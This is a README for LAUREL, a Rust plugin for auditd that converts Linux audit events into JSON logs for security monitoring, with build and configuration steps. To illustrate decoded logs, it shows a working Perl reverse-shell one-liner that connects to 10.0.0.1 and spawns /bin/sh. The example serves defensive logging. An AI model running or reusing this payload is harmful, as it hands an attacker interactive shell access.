# LAUREL: Linux Audit – Usable, Robust, Easy Logging

LAUREL is an event post-processing plugin for _auditd(8)_ to improve its usability in modern security monitoring setups.

## Why?

TLDR: Instead of audit events that look like this…
```
type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl" a1="-e" a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B65742…
```
…turn them into JSON logs where the mess that your pen testers/red teamers/attackers are trying to make becomes apparent at first glance:
```
{ … "EXECVE":{ "argc": 3,"ARGV": ["perl", "-e", "use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]}, …}
```
At the source.

## Description

Logs produced by the Linux Audit subsystem and _auditd(8)_ contain information that can be very useful in a SIEM context (if a useful rule set has been configured). However, the format is not well-suited for at-scale analysis: Events are usually split across different lines that have to be merged using a message identifier. Files and program executions are logged via `PATH` and `EXECVE` elements, but a limited character set for strings causes many of those entries to be hex-encoded. For a more detailed discussion, see [Practical _auditd(8)_ problems](practical-auditd-problems.md).

_LAUREL_ solves these problems by consuming audit events, parsing and transforming them into more data and writing them out as a JSON-based log format, while keeping all information intact that was part of the original audit log. It does not replace _auditd(8)_ as the consumer of audit messages from the kernel. Instead, it uses the _audisp_ ("audit dispatch") interface to receive messages via _auditd(8)_. Therefore, it can peacefully coexist with other consumers of audit events (e.g. some EDR products).

Refer to [JSON-based log format](json-format.md) for a description of the log format.

We developed this tool because we were not content with feature sets and performance characteristics of existing projects and products. Please refer to [Performance](performance.md) for details.

## Build from source…

_LAUREL_ is written in Rust. To build it, a reasonably recent Rust compiler (we currently use 1.48), `cargo`, and the 
`libacl` library and its header files (Debian: `libacl1-dev`, RedHat: `libacl-devel`) are required.

``` console
$ cargo build --release
$ sudo install -m755 target/release/laurel /usr/local/sbin/laurel
```

## …or use the provided binary

Static Linux/x86_64 binaries are built for tagged releases.

## Configure, use

- Create a dedicated user, e.g.:
    ``` console
    $ sudo useradd --system --home-dir /var/log/laurel --create-home _laurel
    ```
- Configure _LAUREL_: Copy the provided annotated [example](etc/laurel/config.toml) to `/etc/laurel/config.toml` and customize it.
- Register _LAUREL_ as an _audisp_ plugin: Copy the provided [example](etc/audit/plugins.d/laurel.conf) to `/etc/audisp/plugins.d/laurel.conf` or `/etc/audit/plugins.d/laurel.conf` (depending on your _auditd_ version).
- If you are running SELinux, compile the provided policy and install it into the running kernel:
    ``` console
    $ make -C contrib/selinux
    $ sudo semodule -i contrib/selinux/laurel.pp
    $ sudo restorecon -v -R -F /usr/local/sbin/laurel /etc/laurel /var/log/laurel
    ```
- Tell _auditd(8)_ to re-evaluate its configuration
    ``` console
    $ sudo pkill -HUP auditd
    ```

## Test, Debug

For debugging and other testing purposes, _LAUREL_ can be run without specifying any configuration file. It will not change users and read events from standard input, just as it would when called from _auditd_. Log entries arewritten to `audit.log` in the current working directory.
